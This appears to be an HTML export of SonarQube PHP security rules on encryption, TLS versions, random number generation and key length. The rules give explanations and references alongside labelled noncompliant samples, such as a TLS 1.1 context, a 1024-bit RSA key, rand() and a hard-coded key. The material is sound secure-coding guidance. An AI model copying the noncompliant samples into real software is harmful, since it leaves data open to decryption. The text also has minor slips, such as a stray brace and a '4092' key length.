          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4787">
              php:S4787
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=php%3AS4426&rule_key=php%3AS4426'>S4426</a>, <a href='/organizations/sopra-steria/rules?open=php%3AS5542&rule_key=php%3AS5542'>S5542</a>, <a href='/organizations/sopra-steria/rules?open=php%3AS5547&rule_key=php%3AS5547'>S5547</a> instead.</p>
<p>Encrypting data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7902">CVE-2017-7902</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1378">CVE-2006-1378</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1376">CVE-2003-1376</a> </li>
</ul>
<p>Proper encryption requires both the encryption algorithm and the key to be strong. Obviously the private key needs to remain secret and be renewed
regularly. However these are not the only means to defeat or weaken an encryption.</p>
<p>This rule flags function calls that initiate encryption/decryption.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the private key might not be random, strong enough or the same key is reused for a long long time. </li>
  <li> the private key might be compromised. It can happen when it is stored in an unsafe place or when it was transferred in an unsafe manner. </li>
  <li> the key exchange is made without properly authenticating the receiver. </li>
  <li> the encryption algorithm is not strong enough for the level of protection required. Note that encryption algorithms strength decreases as time
  passes. </li>
  <li> the chosen encryption library is deemed unsafe. </li>
  <li> a nonce is used, and the same value is reused multiple times, or the nonce is not random. </li>
  <li> the RSA algorithm is used, and it does not incorporate an Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.
  </li>
  <li> the CBC (Cypher Block Chaining) algorithm is used for encryption, and it’s IV (Initialization Vector) is not generated using a secure random
  algorithm, or it is reused. </li>
  <li> the Advanced Encryption Standard (AES) encryption algorithm is used with an unsecure mode. See the recommended practices for more information.
  </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Generate encryption keys using secure random algorithms. </li>
  <li> When generating cryptographic keys (or key pairs), it is important to use a key length that provides enough entropy against brute-force
  attacks. For the Blowfish algorithm the key should be at least 128 bits long, while for the RSA algorithm it should be at least 2048 bits long.
  </li>
  <li> Regenerate the keys regularly. </li>
  <li> Always store the keys in a safe location and transfer them only over safe channels. </li>
  <li> If there is an exchange of cryptographic keys, check first the identity of the receiver. </li>
  <li> Only use strong encryption algorithms. Check regularly that the algorithm is still deemed secure. It is also imperative that they are
  implemented correctly. Use only encryption libraries which are deemed secure. Do not define your own encryption algorithms as they will most
  probably have flaws. </li>
  <li> When a nonce is used, generate it randomly every time. </li>
  <li> When using the RSA algorithm, incorporate an Optimal Asymmetric Encryption Padding (OAEP). </li>
  <li> When CBC is used for encryption, the IV must be random and unpredictable. Otherwise it exposes the encrypted value to crypto-analysis attacks
  like "Chosen-Plaintext Attacks". Thus a secure random algorithm should be used. An IV value should be associated to one and only one encryption
  cycle, because the IV’s purpose is to ensure that the same plaintext encrypted twice will yield two different ciphertexts. </li>
  <li> The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Galois/Counter Mode (GCM) with no padding should be
  preferred to the following combinations which are not secured:
    <ul>
      <li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it
      does not hide data patterns well. In some senses, it doesn’t provide serious message confidentiality, and it is not recommended for use in
      cryptographic protocols at all. </li>
      <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li>
    </ul>  </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>Builtin functions</p>
<pre>
function myEncrypt($cipher, $key, $data, $mode, $iv, $options, $padding, $infile, $outfile, $recipcerts, $headers, $nonce, $ad, $pub_key_ids, $env_keys)
{
    mcrypt_ecb ($cipher, $key, $data, $mode); // Sensitive
    mcrypt_cfb($cipher, $key, $data, $mode, $iv); // Sensitive
    mcrypt_cbc($cipher, $key, $data, $mode, $iv); // Sensitive
    mcrypt_encrypt($cipher, $key, $data, $mode); // Sensitive

    openssl_encrypt($data, $cipher, $key, $options, $iv); // Sensitive
    openssl_public_encrypt($data, $crypted, $key, $padding); // Sensitive
    openssl_pkcs7_encrypt($infile, $outfile, $recipcerts, $headers); // Sensitive
    openssl_seal($data, $sealed_data, $env_keys, $pub_key_ids); // Sensitive

    sodium_crypto_aead_aes256gcm_encrypt ($data, $ad, $nonce, $key); // Sensitive
    sodium_crypto_aead_chacha20poly1305_encrypt ($data, $ad, $nonce, $key); // Sensitive
    sodium_crypto_aead_chacha20poly1305_ietf_encrypt ($data, $ad, $nonce, $key); // Sensitive
    sodium_crypto_aead_xchacha20poly1305_ietf_encrypt ($data, $ad, $nonce, $key); // Sensitive
    sodium_crypto_box_seal ($data, $key); // Sensitive
    sodium_crypto_box ($data, $nonce, $key); // Sensitive
    sodium_crypto_secretbox ($data, $nonce, $key); // Sensitive
    sodium_crypto_stream_xor ($data, $nonce, $key); // Sensitive
}
</pre>
<p>CakePHP</p>
<pre>
use Cake\Utility\Security;

function myCakeEncrypt($key, $data, $engine)
{
    Security::encrypt($data, $key); // Sensitive

    // Do not use custom made engines and remember that Mcrypt is deprecated.
    Security::engine($engine); // Sensitive. Setting the encryption engine.
}
</pre>
<p>CodeIgniter</p>
<pre>
class EncryptionController extends CI_Controller
{
    public function __construct()
    {
        parent::__construct();
        $this-&gt;load-&gt;library('encryption');
    }

    public function index()
    {
        $this-&gt;encryption-&gt;create_key(16); // Sensitive. Review the key length.
        $this-&gt;encryption-&gt;initialize( // Sensitive.
            array(
                'cipher' =&gt; 'aes-256',
                'mode' =&gt; 'ctr',
                'key' =&gt; 'the key',
            )
        );
        $this-&gt;encryption-&gt;encrypt("mysecretdata"); // Sensitive.
    }
}
</pre>
<p>CraftCMS version 3</p>
<pre>
use Craft;

// This is similar to Yii as it used by CraftCMS
function craftEncrypt($data, $key, $password) {
    Craft::$app-&gt;security-&gt;encryptByKey($data, $key); // Sensitive
    Craft::$app-&gt;getSecurity()-&gt;encryptByKey($data, $key); // Sensitive
    Craft::$app-&gt;security-&gt;encryptByPassword($data, $password); // Sensitive
    Craft::$app-&gt;getSecurity()-&gt;encryptByPassword($data, $password); // Sensitive
}
</pre>
<p>Drupal 7 - Encrypt module</p>
<pre>
function drupalEncrypt() {
    $encrypted_text = encrypt('some string to encrypt'); // Sensitive
}
</pre>
<p>Joomla</p>
<pre>
use Joomla\Crypt\CipherInterface;

abstract class MyCipher implements CipherInterface // Sensitive. Implementing custom cipher class
{}

function joomlaEncrypt() {
    new Joomla\Crypt\Cipher_Sodium(); // Sensitive
    new Joomla\Crypt\Cipher_Simple(); // Sensitive
    new Joomla\Crypt\Cipher_Rijndael256(); // Sensitive
    new Joomla\Crypt\Cipher_Crypto(); // Sensitive
    new Joomla\Crypt\Cipher_Blowfish(); // Sensitive
    new Joomla\Crypt\Cipher_3DES(); // Sensitive
}
}
</pre>
<p>Laravel</p>
<pre>
use Illuminate\Support\Facades\Crypt;

function myLaravelEncrypt($data)
{
    Crypt::encryptString($data); // Sensitive
    Crypt::encrypt($data); // Sensitive
    // encrypt using the Laravel "encrypt" helper
    encrypt($data); // Sensitive
}
</pre>
<p>PHP-Encryption library</p>
<pre>
use Defuse\Crypto\Crypto;
use Defuse\Crypto\File;

function mypPhpEncryption($data, $key, $password, $inputFilename, $outputFilename, $inputHandle, $outputHandle) {
    Crypto::encrypt($data, $key); // Sensitive
    Crypto::encryptWithPassword($data, $password); // Sensitive
    File::encryptFile($inputFilename, $outputFilename, $key); // Sensitive
    File::encryptFileWithPassword($inputFilename, $outputFilename, $password); // Sensitive
    File::encryptResource($inputHandle, $outputHandle, $key); // Sensitive
    File::encryptResourceWithPassword($inputHandle, $outputHandle, $password); // Sensitive
}
</pre>
<p>PhpSecLib</p>
<pre>
function myphpseclib($mode) {
    new phpseclib\Crypt\RSA(); // Sensitive. Note: RSA can also be used for signing data.
    new phpseclib\Crypt\AES(); // Sensitive
    new phpseclib\Crypt\Rijndael(); // Sensitive
    new phpseclib\Crypt\Twofish(); // Sensitive
    new phpseclib\Crypt\Blowfish(); // Sensitive
    new phpseclib\Crypt\RC4(); // Sensitive
    new phpseclib\Crypt\RC2(); // Sensitive
    new phpseclib\Crypt\TripleDES(); // Sensitive
    new phpseclib\Crypt\DES(); // Sensitive

    new phpseclib\Crypt\AES($mode); // Sensitive
    new phpseclib\Crypt\Rijndael($mode); // Sensitive
    new phpseclib\Crypt\TripleDES($mode); // Sensitive
    new phpseclib\Crypt\DES($mode); // Sensitive
}
</pre>
<p>Sodium Compat library</p>
<pre>
function mySodiumCompatEncrypt($data, $ad, $nonce, $key) {
    ParagonIE_Sodium_Compat::crypto_aead_chacha20poly1305_ietf_encrypt($data, $ad, $nonce, $key); // Sensitive
    ParagonIE_Sodium_Compat::crypto_aead_xchacha20poly1305_ietf_encrypt($data, $ad, $nonce, $key); // Sensitive
    ParagonIE_Sodium_Compat::crypto_aead_chacha20poly1305_encrypt($data, $ad, $nonce, $key); // Sensitive

    ParagonIE_Sodium_Compat::crypto_aead_aes256gcm_encrypt($data, $ad, $nonce, $key); // Sensitive

    ParagonIE_Sodium_Compat::crypto_box($data, $nonce, $key); // Sensitive
    ParagonIE_Sodium_Compat::crypto_secretbox($data, $nonce, $key); // Sensitive
    ParagonIE_Sodium_Compat::crypto_box_seal($data, $key); // Sensitive
    ParagonIE_Sodium_Compat::crypto_secretbox_xchacha20poly1305($data, $nonce, $key); // Sensitive
}
</pre>
<p>Yii version 2</p>
<pre>
use Yii;

// Similar to CraftCMS as it uses Yii
function YiiEncrypt($data, $key, $password) {
    Yii::$app-&gt;security-&gt;encryptByKey($data, $key); // Sensitive
    Yii::$app-&gt;getSecurity()-&gt;encryptByKey($data, $key); // Sensitive
    Yii::$app-&gt;security-&gt;encryptByPassword($data, $password); // Sensitive
    Yii::$app-&gt;getSecurity()-&gt;encryptByPassword($data, $password); // Sensitive
}
</pre>
<p>Zend</p>
<pre>
use Zend\Crypt\FileCipher;
use Zend\Crypt\PublicKey\DiffieHellman;
use Zend\Crypt\PublicKey\Rsa;
use Zend\Crypt\Hybrid;
use Zend\Crypt\BlockCipher;

function myZendEncrypt($key, $data, $prime, $options, $generator, $lib)
{
    new FileCipher; // Sensitive. This is used to encrypt files

    new DiffieHellman($prime, $generator, $key); // Sensitive

    $rsa = Rsa::factory([ // Sensitive
        'public_key'    =&gt; 'public_key.pub',
        'private_key'   =&gt; 'private_key.pem',
        'pass_phrase'   =&gt; 'mypassphrase',
        'binary_output' =&gt; false,
    ]);
    $rsa-&gt;encrypt($data); // No issue raised here. The configuration of the Rsa object is the line to review.

    $hybrid = new Hybrid(); // Sensitive

    BlockCipher::factory($lib, $options); // Sensitive
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/321">CWE-321 - Use of Hard-coded Cryptographic Key</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/322">CWE-322 - Key Exchange without Entity Authentication</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/323">CWE-323 - Reusing a Nonce, Key Pair in Encryption</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/324">CWE-324 - Use of a Key Past its Expiration Date</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/325">CWE-325 - Missing Required Cryptographic Step</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/326">CWE-326 - Inadequate Encryption Strength</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4423">
              php:S4423
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are
all considered weak by the cryptographic community, and are officially deprecated:</p>
<ul>
  <li> SSL versions 1.0, 2.0 and 3.0 </li>
  <li> TLS versions 1.0 and 1.1 </li>
</ul>
<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform
mathematical attacks on this data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$opts = array(
  'ssl' =&gt; [
    'crypto_method' =&gt; STREAM_CRYPTO_METHOD_TLSv1_1_CLIENT // Noncompliant
  ],
  'http'=&gt;array(
    'method'=&gt;"GET"
  )
);

$context = stream_context_create($opts);

$fp = fopen('https://www.example.com', 'r', false, $context);
fpassthru($fp);
fclose($fp);
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$opts = array(
  'ssl' =&gt; [
    'crypto_method' =&gt; STREAM_CRYPTO_METHOD_TLSv1_2_CLIENT
  ],
  'http'=&gt;array(
    'method'=&gt;"GET"
  )
);

$context = stream_context_create($opts);

$fp = fopen('https://www.example.com', 'r', false, $context);
fpassthru($fp);
fclose($fp);
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic
community.</p>
<p>The best choices at the moment are the following.</p>
<h4>Use TLS v1.2 or TLS v1.3</h4>
<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>
<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not
yet have TLS v1.3 support.</p>
<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are
deprecated as insecure.</p>
<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS
versions, and improves performance.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S2245">
              php:S2245
            </a>
          </td>
          <td>
            <details>
              <p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386">CVE-2013-6386</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419">CVE-2006-3419</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102">CVE-2008-4102</a> </li>
</ul>
<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<p>As the <code>rand()</code> and <code>mt_rand()</code> functions rely on a pseudorandom number generator, it should not be used for
security-critical applications or for protecting sensitive data.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such
  as a password, is hashed. </li>
  <li> the function you use generates a value which can be predicted (pseudo-random). </li>
  <li> the generated value is used multiple times. </li>
  <li> an attacker can access the generated value. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use functions which rely on a cryptographically strong random number generator such as <code>random_int()</code> or <code>random_bytes()</code>
  or <code>openssl_random_pseudo_bytes()</code> </li>
  <li> When using <code>openssl_random_pseudo_bytes()</code>, provide and check the <code>crypto_strong</code> parameter </li>
  <li> Use the generated random values only once. </li>
  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
$random = rand();
$random2 = mt_rand(0, 99);
</pre>
<h2>Compliant Solution</h2>
<pre>
$randomInt = random_int(0,99); // Compliant; generates a cryptographically secure random integer
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/338">CWE-338 - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/330">CWE-330 - Use of Insufficiently Random Values</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/326">CWE-326 - Inadequate Encryption Strength</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1241">CWE-1241 - Use of Predictable Algorithm in Random Number Generator</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM">Predictable Pseudo Random Number
  Generator</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4426">
              php:S4426
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>
<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>
<ul>
  <li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li>
  <li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.
    <ul>
      <li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key
      Derivation Function 2) </li>
    </ul>  </li>
</ul>
<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at
the plaintext.</p>
<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this
data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>Here is an example of a private key generation with RSA:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
$config = [
    "digest_alg"       =&gt; "sha512",
    "private_key_bits" =&gt; 1024,                 // Noncompliant
    "private_key_type" =&gt; OPENSSL_KEYTYPE_RSA,
];

$res = openssl_pkey_new($config);
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$config = [
    "digest_alg"       =&gt; "sha512",
    "private_key_bits" =&gt; 2048,
    "private_key_type" =&gt; OPENSSL_KEYTYPE_RSA,
];

$res = openssl_pkey_new($config);
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptography community.</p>
<p>The appropriate choices are the following.</p>
<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>
<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>
<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both. It provides 112 bits of security. A key length of
<strong>3072</strong> or <strong>4092</strong> should be preferred when possible.</p>
<h4>AES (Advanced Encryption Standard)</h4>
<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying
all possible keys.<br> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.
Therefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>
<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>
<h4>Elliptic Curve Cryptography (ECC)</h4>
<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve
algorithms is mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>
<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC-based algorithms.</p>
<p>Additionally, some curves that theoretically provide sufficiently long keys are still discouraged. This can be because of a flaw in the curve
parameters, a bad overall design, or poor performance. It is generally advised to use a NIST-approved elliptic curve wherever possible. Such curves
currently include:</p>
<ul>
  <li> NIST P curves with a size of at least 224 bits, e.g. secp256r1. </li>
  <li> Curve25519, generally known as ed25519 or x25519 depending on its application. </li>
  <li> Curve448. </li>
  <li> Brainpool curves with a size of at least 224 bits, e.g. brainpoolP224r1 </li>
</ul>
<h3>Going the extra mile</h3>
<h4>Pre-Quantum Cryptography</h4>
<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br> It is important to keep
in mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or
"post-quantum") counterpart.</p>
<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>
<p><a href="https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation">Learn more here</a>.</p>
<h2>Resources</h2>
<ul>
  <li> Documentation
    <ul>
      <li> NIST Documentation - <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-186.pdf">NIST SP 800-186: Recommendations
      for Discrete Logarithm-based Cryptography: Elliptic Curve Domain Parameters</a> </li>
      <li> IETF - <a href="https://datatracker.ietf.org/doc/html/rfc5639">rfc5639: Elliptic Curve Cryptography (ECC) Brainpool Standard Curves and
      Curve Generation</a> </li>
    </ul>  </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf">NIST 800-131A</a> - Recommendation for Transitioning the
  Use of Cryptographic Algorithms and Key Lengths </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/326">CWE-326 - Inadequate Encryption Strength</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
